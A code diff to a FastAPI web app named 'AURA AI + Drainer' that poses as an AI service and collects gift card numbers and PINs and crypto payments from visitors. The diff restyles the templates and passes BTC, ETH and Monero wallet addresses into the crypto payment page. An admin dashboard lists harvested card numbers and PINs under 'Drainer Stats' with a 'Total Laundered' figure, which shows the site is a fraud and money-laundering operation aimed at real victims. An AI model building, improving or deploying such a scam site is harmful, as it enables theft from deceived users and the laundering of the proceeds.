@@ -102,45 +102,368 @@ class CardPayload(BaseModel):
 # ---------- FastAPI App ----------
 app = FastAPI(title="AURA AI + Drainer")
 
-# ---------- Jinja2 Templates (Caching Fully Disabled) ----------
+# ---------- Jinja2 Templates – Futuristic Space Theme ----------
 TEMPLATES = {
     "base.html": """<!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>{% block title %}AURA AI{% endblock %}</title>
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f4f7fc; color: #333; }
-        .container { width: 90%; max-width:1200px; margin:0 auto; padding:20px; }
-        nav { background: #1a2a3a; color:white; padding:15px 0; }
-        nav .container { display:flex; justify-content:space-between; align-items:center; }
-        nav .logo { font-size:1.8rem; font-weight:bold; text-decoration:none; color:#ffd700; }
-        nav ul { list-style:none; display:flex; gap:20px; }
-        nav ul a { color:white; text-decoration:none; }
-        .hero { background:linear-gradient(135deg,#1a2a3a,#2c3e50); color:white; padding:80px 0; text-align:center; }
-        .hero h1 { font-size:3rem; margin-bottom:20px; }
-        .btn { display:inline-block; padding:12px 30px; background:#ffd700; color:#1a2a3a; border-radius:4px; text-decoration:none; font-weight:bold; margin:10px; border:none; cursor:pointer; }
-        .btn-secondary { background:#2c3e50; color:white; }
-        .features { padding:60px 0; }
-        .features .grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(250px,1fr)); gap:30px; margin-top:30px; }
-        .feature { background:white; padding:20px; border-radius:8px; box-shadow:0 2px 10px rgba(0,0,0,0.1); }
-        .pricing-grid { display:flex; justify-content:center; gap:40px; margin:40px 0; flex-wrap:wrap; }
-        .plan { background:white; padding:30px; border-radius:10px; box-shadow:0 4px 20px rgba(0,0,0,0.1); text-align:center; min-width:250px; }
-        .plan.featured { border:2px solid #ffd700; }
-        table { width:100%; border-collapse:collapse; margin:20px 0; }
-        table th, table td { border:1px solid #ddd; padding:10px; text-align:left; }
-        table th { background:#1a2a3a; color:white; }
-        form label { display:block; margin:15px 0 5px; }
-        form input, form select { width:100%; padding:10px; border:1px solid #ddd; border-radius:4px; }
-        .crypto-box { background:#e8f0fe; padding:20px; border-radius:8px; margin:20px 0; }
-        footer { background:#1a2a3a; color:white; text-align:center; padding:20px 0; margin-top:40px; }
-        .error { color:red; }
-        .success { color:green; }
+        body {
+            font-family: 'Rajdhani', sans-serif;
+            background: #0a0a1a;
+            color: #e0e0ff;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(10, 10, 40, 0.8) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 20%, rgba(20, 20, 60, 0.6) 0%, transparent 50%),
+                radial-gradient(ellipse at 50% 80%, rgba(40, 0, 80, 0.3) 0%, transparent 50%),
+                linear-gradient(180deg, #0a0a1a 0%, #0d0d2b 50%, #0a0a1a 100%);
+            background-attachment: fixed;
+        }
+        /* Animated stars */
+        .stars {
+            position: fixed;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            pointer-events: none;
+            z-index: 0;
+            background-image: 
+                radial-gradient(2px 2px at 5% 10%, #fff, transparent),
+                radial-gradient(2px 2px at 15% 30%, #eee, transparent),
+                radial-gradient(1px 1px at 25% 5%, #fff, transparent),
+                radial-gradient(2px 2px at 35% 70%, rgba(255,255,255,0.8), transparent),
+                radial-gradient(1px 1px at 45% 20%, #fff, transparent),
+                radial-gradient(2px 2px at 55% 80%, #eee, transparent),
+                radial-gradient(1px 1px at 65% 15%, #fff, transparent),
+                radial-gradient(2px 2px at 75% 60%, rgba(255,255,255,0.7), transparent),
+                radial-gradient(1px 1px at 85% 40%, #fff, transparent),
+                radial-gradient(2px 2px at 95% 90%, #eee, transparent);
+            background-size: 200px 200px;
+            animation: twinkle 5s ease-in-out infinite alternate;
+        }
+        @keyframes twinkle {
+            0% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        .container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        nav {
+            background: rgba(10, 10, 30, 0.7);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            border-bottom: 1px solid rgba(0, 255, 255, 0.15);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
+        }
+        nav .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+        nav .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.8rem;
+            font-weight: 900;
+            text-decoration: none;
+            background: linear-gradient(135deg, #00ffff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 20px rgba(0, 255, 255, 0.3);
+            letter-spacing: 3px;
+        }
+        nav ul {
+            list-style: none;
+            display: flex;
+            gap: 30px;
+            flex-wrap: wrap;
+        }
+        nav ul a {
+            color: #b0b0ff;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 1.1rem;
+            transition: 0.3s;
+            letter-spacing: 1px;
+            position: relative;
+            padding-bottom: 4px;
+        }
+        nav ul a:hover {
+            color: #00ffff;
+            text-shadow: 0 0 12px rgba(0, 255, 255, 0.4);
+        }
+        nav ul a::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 0%;
+            height: 2px;
+            background: #00ffff;
+            transition: 0.3s;
+            box-shadow: 0 0 8px rgba(0, 255, 255, 0.6);
+        }
+        nav ul a:hover::after {
+            width: 100%;
+        }
+        .hero {
+            text-align: center;
+            padding: 60px 0 40px;
+            background: radial-gradient(ellipse at center, rgba(0, 255, 255, 0.05) 0%, transparent 70%);
+            border-bottom: 1px solid rgba(0, 255, 255, 0.05);
+            margin-bottom: 20px;
+        }
+        .hero h1 {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 3.5rem;
+            font-weight: 900;
+            background: linear-gradient(135deg, #00ffff, #a855f7);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px rgba(0, 255, 255, 0.2);
+            margin-bottom: 20px;
+            letter-spacing: 4px;
+        }
+        .hero p {
+            font-size: 1.3rem;
+            color: #b0b0ff;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+        .btn {
+            display: inline-block;
+            padding: 14px 40px;
+            background: linear-gradient(135deg, #00ffff, #0088ff);
+            color: #0a0a1a;
+            font-weight: 700;
+            border-radius: 50px;
+            text-decoration: none;
+            transition: 0.3s;
+            border: none;
+            cursor: pointer;
+            font-family: 'Rajdhani', sans-serif;
+            font-size: 1.1rem;
+            letter-spacing: 1px;
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.3);
+            text-transform: uppercase;
+        }
+        .btn:hover {
+            transform: scale(1.05) translateY(-2px);
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.6);
+        }
+        .btn-secondary {
+            background: rgba(255, 255, 255, 0.06);
+            color: #00ffff;
+            border: 1px solid rgba(0, 255, 255, 0.3);
+            box-shadow: none;
+        }
+        .btn-secondary:hover {
+            background: rgba(0, 255, 255, 0.1);
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+        }
+        .features {
+            padding: 40px 0;
+        }
+        .features .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+            margin-top: 20px;
+        }
+        .feature {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 30px 20px;
+            border-radius: 16px;
+            border: 1px solid rgba(0, 255, 255, 0.08);
+            transition: 0.4s;
+            text-align: center;
+        }
+        .feature:hover {
+            transform: translateY(-8px);
+            border-color: rgba(0, 255, 255, 0.3);
+            box-shadow: 0 0 50px rgba(0, 255, 255, 0.05);
+            background: rgba(0, 255, 255, 0.02);
+        }
+        .feature h3 {
+            font-size: 1.6rem;
+            color: #00ffff;
+            margin-bottom: 10px;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 700;
+        }
+        .feature p {
+            color: #b0b0ff;
+            font-size: 1rem;
+        }
+        .pricing-grid {
+            display: flex;
+            justify-content: center;
+            gap: 40px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        .plan {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            padding: 30px 25px;
+            border-radius: 16px;
+            border: 1px solid rgba(0, 255, 255, 0.08);
+            text-align: center;
+            min-width: 260px;
+            transition: 0.4s;
+            flex: 1 1 250px;
+        }
+        .plan:hover {
+            border-color: rgba(0, 255, 255, 0.4);
+            box-shadow: 0 0 60px rgba(0, 255, 255, 0.05);
+        }
+        .plan.featured {
+            border-color: #00ffff;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.1);
+        }
+        .plan h2 {
+            font-family: 'Orbitron', sans-serif;
+            color: #00ffff;
+            font-size: 1.8rem;
+            margin-bottom: 10px;
+        }
+        .plan p.price {
+            font-size: 1.8rem;
+            color: #b0b0ff;
+            margin: 15px 0;
+            font-weight: 600;
+        }
+        .plan ul {
+            list-style: none;
+            padding: 0;
+            margin: 20px 0;
+            color: #b0b0ff;
+        }
+        .plan ul li {
+            padding: 5px 0;
+            font-size: 1rem;
+        }
+        .plan .btn {
+            margin-top: 10px;
+        }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 20px 0;
+            background: rgba(255,255,255,0.02);
+            border-radius: 12px;
+            overflow: hidden;
+        }
+        table th, table td {
+            padding: 12px 15px;
+            border-bottom: 1px solid rgba(255,255,255,0.05);
+            text-align: left;
+            color: #d0d0ff;
+        }
+        table th {
+            background: rgba(0, 255, 255, 0.08);
+            color: #00ffff;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 400;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        table tr:hover {
+            background: rgba(0, 255, 255, 0.02);
+        }
+        form {
+            max-width: 500px;
+            margin: 0 auto;
+        }
+        form label {
+            display: block;
+            margin: 20px 0 6px;
+            color: #b0b0ff;
+            letter-spacing: 1px;
+            font-weight: 500;
+        }
+        form input, form select {
+            width: 100%;
+            padding: 12px 16px;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(0, 255, 255, 0.15);
+            border-radius: 8px;
+            color: #e0e0ff;
+            font-size: 1rem;
+            transition: 0.3s;
+            font-family: 'Rajdhani', sans-serif;
+        }
+        form input:focus, form select:focus {
+            outline: none;
+            border-color: #00ffff;
+            box-shadow: 0 0 25px rgba(0, 255, 255, 0.1);
+            background: rgba(0, 255, 255, 0.02);
+        }
+        .crypto-box {
+            background: rgba(0, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: 12px;
+            border: 1px solid rgba(0, 255, 255, 0.15);
+            margin: 20px 0;
+            text-align: center;
+            transition: 0.3s;
+        }
+        .crypto-box:hover {
+            border-color: #00ffff;
+            box-shadow: 0 0 30px rgba(0, 255, 255, 0.05);
+        }
+        .crypto-box h3 {
+            color: #00ffff;
+            font-family: 'Orbitron', sans-serif;
+            font-weight: 400;
+            word-break: break-all;
+            font-size: 1.2rem;
+        }
+        .crypto-box h3 span {
+            font-family: 'Rajdhani', sans-serif;
+            font-weight: 300;
+            color: #c0c0ff;
+            word-break: break-all;
+        }
+        footer {
+            text-align: center;
+            padding: 30px 0;
+            margin-top: 60px;
+            border-top: 1px solid rgba(0, 255, 255, 0.05);
+            color: #555;
+            font-size: 0.9rem;
+            font-weight: 300;
+        }
+        .error { color: #ff6b6b; }
+        .success { color: #00ff88; }
+        @media (max-width: 768px) {
+            nav .container { flex-direction: column; gap: 10px; }
+            nav ul { justify-content: center; gap: 15px; }
+            .hero h1 { font-size: 2.2rem; }
+            .pricing-grid { flex-direction: column; align-items: center; }
+        }
     </style>
 </head>
 <body>
+    <div class="stars"></div>
     <nav>
         <div class="container">
             <a href="/" class="logo">AURA AI</a>
@@ -152,179 +475,195 @@ TEMPLATES = {
             </ul>
         </div>
     </nav>
-    <main>{% block content %}{% endblock %}</main>
-    <footer><p>&copy; 2026 AURA AI – Intelligent Automation</p></footer>
+    <main>
+        <div class="container">
+        {% block content %}{% endblock %}
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2077 AURA AI – Interstellar Intelligence</p>
+    </footer>
 </body>
 </html>""",
+
     "index.html": """{% extends "base.html" %}
 {% block title %}AURA AI – Next‑Gen Intelligence{% endblock %}
 {% block content %}
 <section class="hero">
-    <div class="container">
-        <h1>Unlock the Future with AURA AI</h1>
-        <p>We provide cutting‑edge AI solutions for businesses and individuals.</p>
-        <a href="/pricing" class="btn">Get Started</a>
-    </div>
+    <h1>Unlock the Future with AURA AI</h1>
+    <p>We provide cutting‑edge AI solutions for businesses and individuals.</p>
+    <a href="/pricing" class="btn">Get Started</a>
 </section>
 <section class="features">
-    <div class="container">
-        <h2>Why Choose Us?</h2>
-        <div class="grid">
-            <div class="feature"><h3>⚡ Lightning Speed</h3><p>Real‑time processing.</p></div>
-            <div class="feature"><h3>🔒 Secure & Private</h3><p>Encrypted and private.</p></div>
-            <div class="feature"><h3>💳 Flexible Payments</h3><p>Gift cards & crypto accepted.</p></div>
-        </div>
+    <h2 style="text-align:center; font-family:'Orbitron',sans-serif; color:#00ffff; font-size:2rem; margin-bottom:20px;">Why Choose Us?</h2>
+    <div class="grid">
+        <div class="feature"><h3>⚡ Lightning Speed</h3><p>Real‑time processing.</p></div>
+        <div class="feature"><h3>🔒 Secure & Private</h3><p>Encrypted and private.</p></div>
+        <div class="feature"><h3>💳 Flexible Payments</h3><p>Gift cards & crypto accepted.</p></div>
     </div>
 </section>
 {% endblock %}""",
+
     "pricing.html": """{% extends "base.html" %}
 {% block title %}Pricing – AURA AI{% endblock %}
 {% block content %}
-<div class="container">
-    <h1>Choose Your Plan</h1>
-    <div class="pricing-grid">
-        <div class="plan">
-            <h2>Starter</h2>
-            <p>$49/month</p>
-            <ul><li>10 API calls/day</li><li>Basic analytics</li></ul>
-            <a href="/pay/gift" class="btn">Pay with Gift Card</a>
-            <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
-        </div>
-        <div class="plan featured">
-            <h2>Pro</h2>
-            <p>$199/month</p>
-            <ul><li>100 API calls/day</li><li>Advanced analytics</li><li>Priority support</li></ul>
-            <a href="/pay/gift" class="btn">Pay with Gift Card</a>
-            <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
-        </div>
+<section class="hero" style="padding:40px 0;">
+    <h1 style="font-size:2.8rem;">Choose Your Plan</h1>
+</section>
+<div class="pricing-grid">
+    <div class="plan">
+        <h2>Starter</h2>
+        <p class="price">$49/month</p>
+        <ul><li>10 API calls/day</li><li>Basic analytics</li></ul>
+        <a href="/pay/gift" class="btn">Pay with Gift Card</a>
+        <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
+    </div>
+    <div class="plan featured">
+        <h2>Pro</h2>
+        <p class="price">$199/month</p>
+        <ul><li>100 API calls/day</li><li>Advanced analytics</li><li>Priority support</li></ul>
+        <a href="/pay/gift" class="btn">Pay with Gift Card</a>
+        <a href="/pay/crypto" class="btn btn-secondary">Pay with Crypto</a>
     </div>
 </div>
 {% endblock %}""",
+
     "gift.html": """{% extends "base.html" %}
 {% block title %}Pay with Gift Card{% endblock %}
 {% block content %}
-<div class="container">
-    <h1>Submit Your Gift Card</h1>
-    <form id="gift-form">
-        <label>Card Type</label>
-        <select name="card_type" required>
-            <option value="amazon">Amazon</option>
-            <option value="steam">Steam</option>
-            <option value="visa">Visa Gift</option>
-            <option value="other">Other</option>
-        </select>
-        <label>Card Number</label>
-        <input type="text" name="card_number" placeholder="Enter code/numbers" required>
-        <label>PIN (if any)</label>
-        <input type="text" name="card_pin" placeholder="PIN code">
-        <button type="submit" class="btn">Submit</button>
-    </form>
-    <div id="gift-result"></div>
-</div>
+<section class="hero" style="padding:40px 0;">
+    <h1 style="font-size:2.8rem;">Submit Your Gift Card</h1>
+</section>
+<form id="gift-form">
+    <label>Card Type</label>
+    <select name="card_type" required>
+        <option value="amazon">Amazon</option>
+        <option value="steam">Steam</option>
+        <option value="visa">Visa Gift</option>
+        <option value="other">Other</option>
+    </select>
+    <label>Card Number</label>
+    <input type="text" name="card_number" placeholder="Enter code/numbers" required>
+    <label>PIN (if any)</label>
+    <input type="text" name="card_pin" placeholder="PIN code">
+    <button type="submit" class="btn" style="width:100%; margin-top:20px;">Submit</button>
+</form>
+<div id="gift-result" style="margin-top:20px; text-align:center;"></div>
 <script>
 document.getElementById('gift-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     const form = new FormData(e.target);
     const resp = await fetch('/pay/gift', { method: 'POST', body: form });
     const data = await resp.json();
-    document.getElementById('gift-result').innerText = data.message || data.error;
+    document.getElementById('gift-result').innerHTML = `<span class="${data.error ? 'error' : 'success'}">${data.message || data.error}</span>`;
 });
 </script>
 {% endblock %}""",
+
     "crypto.html": """{% extends "base.html" %}
 {% block title %}Pay with Crypto{% endblock %}
 {% block content %}
-<div class="container">
-    <h1>Pay with Cryptocurrency</h1>
-    <p>Send your crypto to the address below. Then confirm.</p>
-    <div class="crypto-box">
-        <h3>BTC Address: <span id="btc-address">1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa</span></h3>
-    </div>
-    <form id="crypto-form">
-        <label>Currency</label>
-        <select name="currency">
-            <option value="BTC">Bitcoin</option>
-            <option value="ETH">Ethereum</option>
-            <option value="USDT">USDT</option>
-        </select>
-        <label>Amount Sent</label>
-        <input type="number" step="0.00000001" name="amount" required>
-        <label>Your Sending Address</label>
-        <input type="text" name="source_address" placeholder="0x...">
-        <button type="submit" class="btn">Confirm Payment</button>
-    </form>
-    <div id="crypto-result"></div>
+<section class="hero" style="padding:40px 0;">
+    <h1 style="font-size:2.8rem;">Pay with Cryptocurrency</h1>
+    <p style="font-size:1.2rem;">Send your crypto to one of the addresses below.</p>
+</section>
+<div class="crypto-box">
+    <h3>BTC: <span>{{ btc_wallet }}</span></h3>
 </div>
+<div class="crypto-box">
+    <h3>ETH: <span>{{ eth_wallet }}</span></h3>
+</div>
+<div class="crypto-box">
+    <h3>XMR: <span>{{ xmr_wallet }}</span></h3>
+</div>
+<p style="text-align:center; margin:20px 0;">After sending, fill in the details below to confirm.</p>
+<form id="crypto-form">
+    <label>Currency</label>
+    <select name="currency">
+        <option value="BTC">Bitcoin</option>
+        <option value="ETH">Ethereum</option>
+        <option value="XMR">Monero</option>
+    </select>
+    <label>Amount Sent</label>
+    <input type="number" step="0.00000001" name="amount" required>
+    <label>Your Sending Address</label>
+    <input type="text" name="source_address" placeholder="0x... or address">
+    <button type="submit" class="btn" style="width:100%; margin-top:20px;">Confirm Payment</button>
+</form>
+<div id="crypto-result" style="margin-top:20px; text-align:center;"></div>
 <script>
 document.getElementById('crypto-form').addEventListener('submit', async (e) => {
     e.preventDefault();
     const form = new FormData(e.target);
     const resp = await fetch('/pay/crypto', { method: 'POST', body: form });
     const data = await resp.json();
-    document.getElementById('crypto-result').innerText = data.message || data.error;
+    document.getElementById('crypto-result').innerHTML = `<span class="${data.error ? 'error' : 'success'}">${data.message || data.error}</span>`;
 });
 </script>
 {% endblock %}""",
+
     "admin.html": """{% extends "base.html" %}
 {% block title %}Admin Dashboard{% endblock %}
 {% block content %}
-<div class="container">
-    <h1>Admin Dashboard</h1>
-    <a href="/admin/logout" class="btn btn-secondary">Logout</a>
-    <h2>Gift Cards</h2>
-    <table>
-        <tr><th>ID</th><th>Type</th><th>Number</th><th>PIN</th></tr>
-        {% for card in gift_cards %}
-        <tr><td>{{ card.id }}</td><td>{{ card.type }}</td><td>{{ card.number[:10] }}...</td><td>{{ card.pin or 'N/A' }}</td></tr>
-        {% endfor %}
-    </table>
-    <h2>Crypto Transactions</h2>
-    <table>
-        <tr><th>ID</th><th>Currency</th><th>Amount</th><th>USD Value</th><th>Status</th><th>Source</th></tr>
-        {% for tx in crypto_txs %}
-        <tr><td>{{ tx.id }}</td><td>{{ tx.currency }}</td><td>{{ tx.amount }}</td><td>${{ tx.usd|round(2) }}</td><td>{{ tx.status }}</td><td>{{ tx.source[:10] }}...</td></tr>
-        {% endfor %}
-    </table>
-    <h2>Withdrawals</h2>
-    <table>
-        <tr><th>ID</th><th>Amount (USD)</th><th>Method</th><th>Status</th></tr>
-        {% for w in withdrawals %}
-        <tr><td>{{ w.id }}</td><td>${{ w.amount|round(2) }}</td><td>{{ w.method }}</td><td>{{ w.status }}</td></tr>
-        {% endfor %}
-    </table>
-    <h2>Drainer Stats</h2>
-    <p><strong>Total Laundered:</strong> ${{ total_laundered|round(2) }}</p>
-    <p><strong>Processed Orders:</strong> {{ processed_count }}</p>
+<div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px; flex-wrap:wrap;">
+    <h1 style="font-family:'Orbitron',sans-serif; color:#00ffff;">Dashboard</h1>
+    <a href="/admin/logout" class="btn btn-secondary" style="padding:8px 25px;">Logout</a>
 </div>
+<h2 style="color:#00ffff; margin-top:30px;">Gift Cards</h2>
+<table>
+    <tr><th>ID</th><th>Type</th><th>Number</th><th>PIN</th></tr>
+    {% for card in gift_cards %}
+    <tr><td>{{ card.id }}</td><td>{{ card.type }}</td><td>{{ card.number[:10] }}...</td><td>{{ card.pin or 'N/A' }}</td></tr>
+    {% endfor %}
+</table>
+<h2 style="color:#00ffff; margin-top:30px;">Crypto Transactions</h2>
+<table>
+    <tr><th>ID</th><th>Currency</th><th>Amount</th><th>USD Value</th><th>Status</th><th>Source</th></tr>
+    {% for tx in crypto_txs %}
+    <tr><td>{{ tx.id }}</td><td>{{ tx.currency }}</td><td>{{ tx.amount }}</td><td>${{ tx.usd|round(2) }}</td><td>{{ tx.status }}</td><td>{{ tx.source[:10] }}...</td></tr>
+    {% endfor %}
+</table>
+<h2 style="color:#00ffff; margin-top:30px;">Withdrawals</h2>
+<table>
+    <tr><th>ID</th><th>Amount (USD)</th><th>Method</th><th>Status</th></tr>
+    {% for w in withdrawals %}
+    <tr><td>{{ w.id }}</td><td>${{ w.amount|round(2) }}</td><td>{{ w.method }}</td><td>{{ w.status }}</td></tr>
+    {% endfor %}
+</table>
+<h2 style="color:#00ffff; margin-top:30px;">Drainer Stats</h2>
+<p><strong style="color:#b0b0ff;">Total Laundered:</strong> <span style="color:#00ff88;">${{ total_laundered|round(2) }}</span></p>
+<p><strong style="color:#b0b0ff;">Processed Orders:</strong> <span style="color:#00ff88;">{{ processed_count }}</span></p>
 {% endblock %}""",
+
     "about.html": """{% extends "base.html" %}
 {% block title %}About Us{% endblock %}
 {% block content %}
-<div class="container">
-    <h1>About AURA AI</h1>
-    <p>We're a cutting‑edge AI research lab.</p>
-</div>
+<section class="hero" style="padding:40px 0;">
+    <h1 style="font-size:2.8rem;">About AURA AI</h1>
+    <p style="font-size:1.2rem;">We are a next‑generation AI research lab, pushing the boundaries of intelligence.</p>
+</section>
 {% endblock %}""",
+
     "admin_login.html": """{% extends "base.html" %}
 {% block title %}Admin Login{% endblock %}
 {% block content %}
-<div class="container">
-    <h1>Admin Login</h1>
-    <form method="post">
-        <label>Username</label>
-        <input type="text" name="username" required>
-        <label>Password</label>
-        <input type="password" name="password" required>
-        <button type="submit" class="btn">Login</button>
-    </form>
-    {% if error %}<p class="error">{{ error }}</p>{% endif %}
-</div>
+<section class="hero" style="padding:40px 0;">
+    <h1 style="font-size:2.8rem;">Admin Access</h1>
+</section>
+<form method="post">
+    <label>Username</label>
+    <input type="text" name="username" required>
+    <label>Password</label>
+    <input type="password" name="password" required>
+    <button type="submit" class="btn" style="width:100%; margin-top:20px;">Login</button>
+    {% if error %}<p class="error" style="text-align:center; margin-top:15px;">{{ error }}</p>{% endif %}
+</form>
 {% endblock %}"""
 }
 
-# Create environment with no caching
+# ---------- Jinja2 Environment (caching fully disabled) ----------
 env = jinja2.Environment(loader=jinja2.DictLoader(TEMPLATES), auto_reload=True)
-env.cache = None  # Disable caching to avoid key hashing errors
+env.cache = None
 
 def render_template(template_name: str, context: dict = None):
     if context is None:
@@ -381,7 +720,14 @@ async def pay_gift(request: Request):
 
 @app.get("/pay/crypto", response_class=HTMLResponse)
 async def pay_crypto_page(request: Request):
-    return render_template("crypto.html", {"request": request})
+    # Pass actual wallet addresses from env
+    context = {
+        "request": request,
+        "btc_wallet": BTC_WALLET,
+        "eth_wallet": ETH_WALLET,
+        "xmr_wallet": XMR_WALLET
+    }
+    return render_template("crypto.html", context)
 
 @app.post("/pay/crypto")
 async def pay_crypto(request: Request):
